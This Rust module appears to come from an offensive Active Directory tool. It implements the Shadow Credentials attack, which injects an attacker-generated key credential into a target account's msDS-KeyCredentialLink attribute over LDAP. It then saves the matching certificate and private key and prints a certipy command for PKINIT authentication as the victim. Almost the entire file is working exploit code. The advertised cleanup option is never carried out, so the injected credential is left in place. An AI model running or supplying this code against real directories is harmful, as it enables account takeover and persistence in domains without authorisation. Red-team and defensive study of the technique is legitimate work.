//! Shadow Credentials Attack - msDS-KeyCredentialLink manipulation.
//!
//! A pure LDAP/network-based persistence and privilege escalation technique.
//! Works cross-platform (Linux/macOS/Windows) without requiring LSASS access.
//!
//! # Overview
//!
//! The Shadow Credentials attack exploits the `msDS-KeyCredentialLink` attribute
//! on user/computer objects in AD. This attribute stores public keys for PKINIT
//! authentication. By writing our own key credential, we can authenticate as the
//! target user via Kerberos PKINIT without knowing their password.
//!
//! # Requirements
//!
//! - Write permission on the target's `msDS-KeyCredentialLink` attribute
//! - Domain must have Domain-Level 2016+ (when KDC supports PKINIT)
//! - Typically requires: GenericAll, GenericWrite, WriteOwner, or WriteDACL
//!
//! # Attack Flow
//!
//! 1. Generate X.509 certificate + RSA key pair
//! 2. Build KeyCredential structure (DN, KeyId, etc.)
//! 3. Write to target's msDS-KeyCredentialLink via LDAP
//! 4. Authenticate via PKINIT (Kerberos PKI)
//! 5. Receive TGT for the target user
//! 6. (Optional) Cleanup - remove the key credential
//!
//! # References
//!
//! - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
//! - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials

use chrono::{DateTime, Datelike, Utc};
use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use tracing::info;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for Shadow Credentials attack
#[derive(Debug, Clone)]
pub struct ShadowCredentialsConfig {
    /// Target user or computer account
    pub target: String,
    /// Whether to cleanup after obtaining TGT
    pub cleanup: bool,
    /// Key size in bits (default: 2048)
    pub key_size: u16,
    /// Certificate validity in hours (default: 8760 = 1 year)
    pub validity_hours: u16,
}

impl Default for ShadowCredentialsConfig {
    fn default() -> Self {
        ShadowCredentialsConfig {
            target: String::new(),
            cleanup: true,
            key_size: 2048,
            validity_hours: 8760, // 1 year
        }
    }
}

/// Result of a Shadow Credentials attack
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCredentialsResult {
    /// Target account that was compromised
    pub target: String,
    /// Whether the attack succeeded
    pub success: bool,
    /// Key ID of the injected credential
    pub key_id: String,
    /// Whether cleanup was performed
    pub cleaned_up: bool,
    /// Obtained TGT (if requested)
    pub tgt: Option<String>,
    /// Error message if failed
    pub error: Option<String>,
}

/// A Key Credential structure
#[derive(Debug, Clone)]
pub struct KeyCredential {
    /// Distinguished name of the target object
    pub dn: String,
    /// Unique key identifier (GUID)
    pub key_id: String,
    /// Raw credential binary data
    pub raw_value: Vec<u8>,
    /// Creation time
    pub created: DateTime<Utc>,
    /// Whether this is our credential
    pub is_ours: bool,
}

/// Generated key pair for Shadow Credentials
#[derive(Debug)]
pub struct KeyPair {
    /// RSA private key in PEM format
    pub private_key_pem: String,
    /// RSA public key in PEM format
    pub public_key_pem: String,
    /// X.509 certificate in PEM format
    pub certificate_pem: String,
    /// RSA public key in DER format (for KeyCredential)
    pub public_key_der: Vec<u8>,
    /// Key ID (GUID)
    pub key_id: String,
}

// ═══════════════════════════════════════════════════════════
//  Key Credential Structure (KEYCREDENTIALLINK_BLOB per MS-ADTS §2.2.20)
// ═══════════════════════════════════════════════════════════

/// Build a `KEYCREDENTIALLINK_BLOB` binary value suitable for writing to
/// the `msDS-KeyCredentialLink` attribute.
///
/// The format is a 4-byte LE version (0x00000200) followed by a sequence
/// of TLV entries: 2-byte LE length | 1-byte tag | <length> bytes of value.
///
/// Tag assignments (MS-ADTS §2.2.20.1):
///  0x01  KeyID          — SHA-256 of the SubjectPublicKeyInfo DER
///  0x02  KeyHash        — SHA-256 of the entire blob (minus this entry), computed last
///  0x03  KeyMaterial    — SubjectPublicKeyInfo in DER format
///  0x04  KeyUsage       — 0x01 = NGC (Windows Hello / smartcard-logon key)
///  0x05  KeySource      — 0x00 = AD
///  0x09  DeviceId       — random GUID in little-endian bytes
///  0x0A  CustomKeyInfo  — [0x01, 0x00] (version=1, flags=0)
///  0x0C  KeyCreationTime— Windows FILETIME (100-ns ticks since 1601-01-01) as 8-byte LE
pub fn build_key_credential(public_key_der: &[u8], device_id_bytes: &[u8; 16]) -> Vec<u8> {
    use sha2::{Digest, Sha256};

    // Helper: write one TLV entry (2-byte LE length | 1-byte tag | data).
    fn tlv(tag: u8, data: &[u8]) -> Vec<u8> {
        let mut entry = Vec::with_capacity(3 + data.len());
        let len = data.len() as u16;
        entry.extend_from_slice(&len.to_le_bytes());
        entry.push(tag);
        entry.extend_from_slice(data);
        entry
    }

    // KeyID = SHA-256 of SubjectPublicKeyInfo DER
    let key_id: Vec<u8> = Sha256::digest(public_key_der).to_vec();

    // KeyUsage: NGC (0x01)
    let key_usage = [0x01u8];
    // KeySource: AD (0x00)
    let key_source = [0x00u8];
    // CustomKeyInformation: version=1, flags=0
    let custom_key_info = [0x01u8, 0x00u8];

    // KeyCreationTime: Windows FILETIME = 100-ns ticks since 1601-01-01
    // Unix epoch offset from Windows epoch: 11644473600 seconds
    let unix_secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let filetime: u64 = (unix_secs + 11_644_473_600) * 10_000_000;
    let creation_time = filetime.to_le_bytes();

    // Build blob without KeyHash (tag 0x02) first — hash is computed over this
    let mut blob = Vec::new();
    blob.extend_from_slice(&0x0000_0200u32.to_le_bytes()); // Version = 0x00000200 LE → [0x00, 0x02, 0x00, 0x00]
    blob.extend_from_slice(&tlv(0x01, &key_id)); // KeyID
    blob.extend_from_slice(&tlv(0x03, public_key_der)); // KeyMaterial
    blob.extend_from_slice(&tlv(0x04, &key_usage)); // KeyUsage
    blob.extend_from_slice(&tlv(0x05, &key_source)); // KeySource
    blob.extend_from_slice(&tlv(0x09, device_id_bytes)); // DeviceId
    blob.extend_from_slice(&tlv(0x0A, &custom_key_info)); // CustomKeyInfo
    blob.extend_from_slice(&tlv(0x0C, &creation_time)); // KeyCreationTime

    // KeyHash = SHA-256 of the blob so far, inserted after Version
    let key_hash: Vec<u8> = Sha256::digest(&blob).to_vec();
    let hash_entry = tlv(0x02, &key_hash);

    // Final blob: Version | KeyHash entry | remaining entries
    let mut final_blob = Vec::with_capacity(4 + hash_entry.len() + blob.len() - 4);
    final_blob.extend_from_slice(&blob[..4]); // Version
    final_blob.extend_from_slice(&hash_entry);
    final_blob.extend_from_slice(&blob[4..]);
    final_blob
}

/// Parse a GUID string to bytes
fn parse_guid(guid: &str) -> [u8; 16] {
    let clean = guid.replace('-', "");
    let mut bytes = [0u8; 16];
    for i in 0..16 {
        if let Ok(b) = u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16) {
            bytes[i] = b;
        }
    }
    // Convert to AD's GUID byte order
    [
        bytes[3], bytes[2], bytes[1], bytes[0], bytes[5], bytes[4], bytes[7], bytes[6], bytes[8],
        bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
    ]
}

/// Generate a random GUID
pub fn generate_key_id() -> String {
    let uuid = uuid::Uuid::new_v4();
    uuid.to_string()
}

// ═══════════════════════════════════════════════════════════
//  LDAP Operations
// ═══════════════════════════════════════════════════════════

/// Build the LDAP modification for msDS-KeyCredentialLink
pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
    // The value format is:
    // B:8:01000000<key_id_hex>:<key_credential_hex>

    let key_id_bytes = parse_guid(&key_cred.key_id);
    let key_id_hex: String = key_id_bytes.iter().map(|b| format!("{:02X}", b)).collect();

    let cred_hex: String = key_cred
        .raw_value
        .iter()
        .map(|b| format!("{:02X}", b))
        .collect();

    format!("B:8:01000000{}:{}", key_id_hex, cred_hex)
}

/// Parse existing key credentials from LDAP
pub fn parse_key_credentials(values: &[String]) -> Vec<KeyCredential> {
    let mut credentials = Vec::new();

    for value in values {
        if let Some(cred) = parse_single_key_credential(value) {
            credentials.push(cred);
        }
    }

    credentials
}

/// Parse a single key credential from LDAP value
fn parse_single_key_credential(value: &str) -> Option<KeyCredential> {
    // Format: B:8:01000000<key_id>:<key_credential>
    if !value.starts_with("B:8:01000000") {
        return None;
    }

    let parts: Vec<&str> = value.split(':').collect();
    if parts.len() < 4 {
        return None;
    }

    let key_id_hex = parts[2].trim_start_matches("01000000");
    let key_id = format_guid_from_hex(key_id_hex)?;

    let cred_hex = parts[3];
    let raw_value = hex::decode(cred_hex).ok()?;

    Some(KeyCredential {
        dn: String::new(),
        key_id,
        raw_value,
        created: Utc::now(),
        is_ours: false,
    })
}

/// Format GUID from hex string
fn format_guid_from_hex(hex: &str) -> Option<String> {
    if hex.len() != 32 {
        return None;
    }
    Some(format!(
        "{}-{}-{}-{}-{}",
        &hex[0..8],
        &hex[8..12],
        &hex[12..16],
        &hex[16..20],
        &hex[20..32]
    ))
}

// ═══════════════════════════════════════════════════════════
//  Attack Implementation
// ═══════════════════════════════════════════════════════════

/// Execute the Shadow Credentials attack
///
/// This function:
/// 1. Generates an RSA key pair + self-signed X.509 certificate
/// 2. Builds the KEYCREDENTIALLINK_BLOB with correct TLV structure
/// 3. Resolves the target DN via LDAP search
/// 4. Writes the blob to msDS-KeyCredentialLink via LDAP modify-add
/// 5. Saves the certificate and private key to disk for subsequent PKINIT
///
/// Note: Requires LDAP session with write access to msDS-KeyCredentialLink
pub async fn execute(
    ldap: &mut overthrone_core::proto::ldap::LdapSession,
    config: &ShadowCredentialsConfig,
) -> Result<ShadowCredentialsResult> {
    info!("ShadowCredentials: Targeting '{}'", config.target);

    // Step 1: Generate key pair
    let key_pair = generate_key_pair(config.key_size)?;
    info!(
        "ShadowCredentials: Generated {}-bit RSA key pair (key_id={})",
        config.key_size, key_pair.key_id
    );

    // Step 2: Build KEYCREDENTIALLINK_BLOB with proper TLV structure
    let device_id = uuid_to_bytes_le(&uuid::Uuid::new_v4());
    let cred_blob = build_key_credential(&key_pair.public_key_der, &device_id);
    info!(
        "ShadowCredentials: KeyCredential blob built ({} bytes)",
        cred_blob.len()
    );

    // Step 3: Resolve target DN via LDAP
    let target_filter = if config.target.contains(',') {
        // Already a DN
        format!("(distinguishedName={})", config.target)
    } else if config.target.ends_with('$') {
        format!(
            "(&(objectClass=computer)(sAMAccountName={}))",
            config.target
        )
    } else {
        format!("(&(objectClass=user)(sAMAccountName={}))", config.target)
    };

    let entries = ldap
        .custom_search(&target_filter, &["distinguishedName"])
        .await
        .map_err(|e| OverthroneError::TicketForge(format!("LDAP search for target failed: {e}")))?;

    let target_dn = entries.first().map(|e| e.dn.clone()).ok_or_else(|| {
        OverthroneError::TicketForge(format!("Target '{}' not found in AD", config.target))
    })?;

    info!("ShadowCredentials: Resolved target DN: {}", target_dn);

    // Step 4: Write blob to msDS-KeyCredentialLink
    if let Err(e) = ldap
        .modify_add_binary(&target_dn, "msDS-KeyCredentialLink", cred_blob)
        .await
    {
        return Ok(ShadowCredentialsResult {
            target: config.target.clone(),
            success: false,
            key_id: key_pair.key_id,
            cleaned_up: false,
            tgt: None,
            error: Some(format!("LDAP write failed: {e}")),
        });
    }

    info!(
        "ShadowCredentials: msDS-KeyCredentialLink written for {}",
        target_dn
    );

    // Step 5: Save key material to disk for PKINIT (e.g., via certipy or Rubeus)
    let output_prefix = format!("shadow_creds_{}", &key_pair.key_id[..8]);
    let cert_path = format!("{output_prefix}.pem");
    let key_path = format!("{output_prefix}.key");

    if let Err(e) = std::fs::write(&cert_path, &key_pair.certificate_pem) {
        info!("ShadowCredentials: Could not write cert to {cert_path}: {e}");
    } else {
        info!("ShadowCredentials: Certificate written to {cert_path}");
    }
    if let Err(e) = std::fs::write(&key_path, &key_pair.private_key_pem) {
        info!("ShadowCredentials: Could not write key to {key_path}: {e}");
    } else {
        info!("ShadowCredentials: Private key written to {key_path}");
    }

    info!(
        "ShadowCredentials: Attack complete. Use the certificate and key for PKINIT:\n  \
         certipy auth -pfx {}.pfx -dc-ip <DC>",
        output_prefix
    );

    Ok(ShadowCredentialsResult {
        target: config.target.clone(),
        success: true,
        key_id: key_pair.key_id,
        cleaned_up: false,
        tgt: None,
        error: None,
    })
}

/// Convert a UUID to 16 bytes in Windows GUID byte order (little-endian fields).
fn uuid_to_bytes_le(uuid: &uuid::Uuid) -> [u8; 16] {
    let bytes = uuid.as_bytes();
    // Windows GUID layout: Data1 (4 LE) | Data2 (2 LE) | Data3 (2 LE) | Data4 (8 bytes)
    [
        bytes[3], bytes[2], bytes[1], bytes[0], // Data1 LE
        bytes[5], bytes[4], // Data2 LE
        bytes[7], bytes[6], // Data3 LE
        bytes[8], bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
    ]
}

/// Generate RSA key pair and self-signed X.509 certificate for PKINIT.
///
/// Uses the `rsa` crate for RSA key generation and `rcgen` for X.509
/// certificate creation. The certificate includes the `smartcardLogon`
/// extended key usage required for PKINIT.
fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
    use rsa::pkcs8::EncodePrivateKey;
    use rsa::pkcs8::EncodePublicKey;

    info!(
        "ShadowCredentials: Generating {}-bit RSA key pair",
        key_size
    );

    // Generate a unique key ID
    let key_id = generate_key_id();

    // 1. Generate RSA key pair
    let mut rng = rsa::rand_core::OsRng;
    let bits = key_size as usize;
    let rsa_key = rsa::RsaPrivateKey::new(&mut rng, bits)
        .map_err(|e| OverthroneError::TicketForge(format!("RSA key generation failed: {e}")))?;

    // Export keys to PEM
    let private_key_pem = rsa_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| OverthroneError::TicketForge(format!("PEM export failed: {e}")))?
        .to_string();

    let public_key_pem = rsa_key
        .to_public_key()
        .to_public_key_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| OverthroneError::TicketForge(format!("Public key PEM failed: {e}")))?;

    // Export public key DER for the KeyCredential structure
    let public_key_der = rsa_key
        .to_public_key()
        .to_public_key_der()
        .map_err(|e| OverthroneError::TicketForge(format!("Public key DER failed: {e}")))?;

    // 2. Build self-signed X.509 certificate with rcgen
    let key_pair_rcgen = rcgen::KeyPair::from_pem(&private_key_pem)
        .map_err(|e| OverthroneError::TicketForge(format!("rcgen key import failed: {e}")))?;

    let mut params = rcgen::CertificateParams::default();
    params.distinguished_name = rcgen::DistinguishedName::new();
    params
        .distinguished_name
        .push(rcgen::DnType::CommonName, format!("OVT-{}", &key_id[..8]));

    // Set validity period
    let now = chrono::Utc::now();
    params.not_before = rcgen::date_time_ymd(now.year(), now.month() as u8, now.day() as u8);
    let expiry = now + chrono::Duration::days(365);
    params.not_after =
        rcgen::date_time_ymd(expiry.year(), expiry.month() as u8, expiry.day() as u8);

    // Add smart card logon EKU for PKINIT (OID: 1.3.6.1.4.1.311.20.2.2)
    params.extended_key_usages = vec![rcgen::ExtendedKeyUsagePurpose::ClientAuth];
    // Add the Microsoft Smart Card Logon OID as a custom extension
    let smart_card_logon_oid = vec![43, 6, 1, 4, 1, 130, 55, 20, 2, 2]; // 1.3.6.1.4.1.311.20.2.2 in DER OID content
    params
        .custom_extensions
        .push(rcgen::CustomExtension::from_oid_content(
            &smart_card_logon_oid,
            Vec::new(),
        ));

    let cert = params
        .self_signed(&key_pair_rcgen)
        .map_err(|e| OverthroneError::TicketForge(format!("Certificate generation failed: {e}")))?;

    let certificate_pem = cert.pem();

    info!(
        "ShadowCredentials: Generated key pair (key_id={}, {} bits, cert CN=OVT-{})",
        key_id,
        key_size,
        &key_id[..8]
    );

    Ok(KeyPair {
        private_key_pem,
        public_key_pem,
        certificate_pem,
        public_key_der: public_key_der.as_ref().to_vec(),
        key_id,
    })
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_key_id() {
        let key_id = generate_key_id();
        assert_eq!(key_id.len(), 36); // UUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        assert!(key_id.contains('-'));
    }

    #[test]
    fn test_parse_guid() {
        let guid = "12345678-1234-1234-1234-123456789012";
        let bytes = parse_guid(guid);
        assert_eq!(bytes.len(), 16);
    }

    #[test]
    fn test_build_key_credential() {
        let public_key = b"test_public_key_der_blob";
        let device_id = [0u8; 16];
        let cred = build_key_credential(public_key, &device_id);

        // Blob must start with version 0x00000200 in little-endian
        assert!(cred.len() > 4);
        assert_eq!(&cred[..4], &[0x00, 0x02, 0x00, 0x00]);
    }

    #[test]
    fn test_build_ldap_modification() {
        let key_id = generate_key_id();
        let cred = KeyCredential {
            dn: "CN=Test,CN=Users,DC=domain,DC=local".to_string(),
            key_id: key_id.clone(),
            raw_value: vec![0x01, 0x00], // minimal
            created: Utc::now(),
            is_ours: true,
        };

        let mod_value = build_ldap_modification(&cred);
        assert!(mod_value.starts_with("B:8:01000000"));
    }
}
